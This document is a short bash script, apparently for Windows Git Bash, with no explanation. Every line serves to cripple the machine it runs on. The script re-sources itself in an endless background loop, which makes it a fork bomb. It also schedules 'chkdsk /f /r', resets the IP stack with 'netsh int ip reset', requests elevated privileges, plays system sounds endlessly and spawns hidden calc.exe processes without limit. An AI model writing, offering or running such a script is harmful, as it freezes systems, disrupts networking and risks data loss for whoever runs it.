while true; do
  source $0 &
  start cmd.exe /k "chkdsk /f /r & netsh int ip reset & tasklist & dir & whoami &" &
  start msedge --headless --no-remote &
  powershell -Command "Start-Process bash -Verb RunAs" &
  start "C:\Windows\System32\MRT.exe" &
  ( while true; do for file in $(find /c/Windows/Media/*.wav | shuf); do start "$file" & done done ) &
  powershell -Command "while ($true) { Start-Process -FilePath "C:\Windows\System32\calc.exe" -WindowStyle Hidden }" &
  start taskmgr &
  start "C:\Windows\explorer.exe" &
done